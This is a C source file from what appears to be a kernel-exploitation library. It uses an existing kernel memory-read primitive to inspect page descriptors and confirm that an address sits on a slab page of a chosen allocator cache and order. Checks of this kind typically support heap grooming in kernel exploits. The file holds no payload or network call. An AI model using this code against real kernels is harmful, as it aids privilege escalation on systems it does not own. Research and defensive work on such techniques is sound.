/* lib/rw/slabpage.c -- see slabpage.h. */
#include "slabpage.h"

#include <string.h>

#include "../addr/physmap.h"
#include "../target.h"

/* Layout of the page descriptor and the flag bits that classify it. All from
 * the target description; the defaults exist so this module compiles standalone
 * and are overridden by any real build. */
#ifndef STRUCT_PAGE_SIZE
#define STRUCT_PAGE_SIZE              0x40
#endif
#ifndef STRUCT_PAGE_FLAGS_OFF
#define STRUCT_PAGE_FLAGS_OFF         0x00
#endif
#ifndef STRUCT_PAGE_COMPOUND_HEAD_OFF
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#endif
#ifndef STRUCT_SLAB_CACHE_OFF
#define STRUCT_SLAB_CACHE_OFF         0x18
#endif
#ifndef PG_SLAB_BIT
#define PG_SLAB_BIT                   9
#endif
#ifndef PG_HEAD_BIT
#define PG_HEAD_BIT                   16
#endif

/* Width of one row of the allocator's size table, in buckets. */
#ifndef KMALLOC_BUCKETS
#define KMALLOC_BUCKETS               14
#endif

/* A pointer read out of the kernel may carry a tag in its top byte; the address
 * it names is the same either way, so compare on the sign-extended value. */
static uint64_t untag(uint64_t v)
{
	return (uint64_t)((int64_t)(v << 8) >> 8);
}

uint64_t lib_slabpage_cache_slot(uint64_t caches_direct, int row, int bucket)
{
	return caches_direct +
	       (uint64_t)((size_t)row * KMALLOC_BUCKETS + (size_t)bucket) * sizeof(uint64_t);
}

int lib_slabpage_check(const struct krw *rw, uint64_t direct,
		       uint64_t want_cache, int want_order,
		       struct lib_slabpage_report *rep)
{
	struct lib_slabpage_report r;
	uint64_t need = (1ULL << PG_HEAD_BIT) | (1ULL << PG_SLAB_BIT);

	memset(&r, 0, sizeof(r));
	r.want_cache = want_cache;
	r.descriptor = lib_direct_to_page(direct);
	if (!r.descriptor)
		return -1;

	if (!krw_read(rw, k_direct_raw(r.descriptor + STRUCT_PAGE_FLAGS_OFF),
		      &r.flags, sizeof(r.flags)) ||
	    !krw_read(rw, k_direct_raw(r.descriptor + STRUCT_PAGE_SIZE + STRUCT_PAGE_FLAGS_OFF),
		      &r.tail_flags, sizeof(r.tail_flags)) ||
	    !krw_read(rw, k_direct_raw(r.descriptor + STRUCT_PAGE_SIZE + STRUCT_PAGE_COMPOUND_HEAD_OFF),
		      &r.compound_head, sizeof(r.compound_head)) ||
	    !krw_read(rw, k_direct_raw(r.descriptor + STRUCT_SLAB_CACHE_OFF),
		      &r.slab_cache, sizeof(r.slab_cache))) {
		if (rep)
			*rep = r;
		return -1;
	}
	/* A tail descriptor carries the allocation order in the low byte of its
	 * flags word. */
	r.order = (int)(r.tail_flags & 0xff);
	if (rep)
		*rep = r;

	if ((r.flags & need) != need)
		return 0;
	if (want_order >= 0 && r.order != want_order)
		return 0;
	/* The low bit marks the back-pointer as a compound head reference. */
	if (r.compound_head != (r.descriptor | 1ULL))
		return 0;
	if (want_cache && untag(r.slab_cache) != untag(want_cache))
		return 0;
	return 1;
}
